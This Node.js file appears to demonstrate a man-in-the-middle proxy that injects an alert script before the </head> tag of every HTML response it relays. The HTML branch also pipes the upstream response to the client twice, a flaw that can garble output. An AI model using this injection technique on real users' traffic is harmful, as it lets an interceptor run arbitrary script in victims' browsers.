const http = require('http');
// Tiny wrapper around Node streams2 Transform to avoid explicit subclassing noise
const through = require('through2');
const url = require('url');
const server = new http.Server();
server.listen(6666);

function rewriteRes(buf, _, next) {
  const script = '<script>alert("BOOM~");</script>';
  const chunk = buf.toString().replace(/(<\/head>)/gi, str => script + str);
  this.push(chunk);
  next();
}

const request = (options, res) => {
  return http.request(options, targetRes => {
    // 对html进行注入
    if (/html/i.test(targetRes.headers['content-type'])) {
      targetRes.pipe(through(rewriteRes)).pipe(res);
    } else {
      targetRes.pipe(res);
    }
    targetRes.pipe(res);
  });
};

server.on('request', (req, res) => {
  const options = url.parse(req.url);
  req.pipe(request(options, res));
});
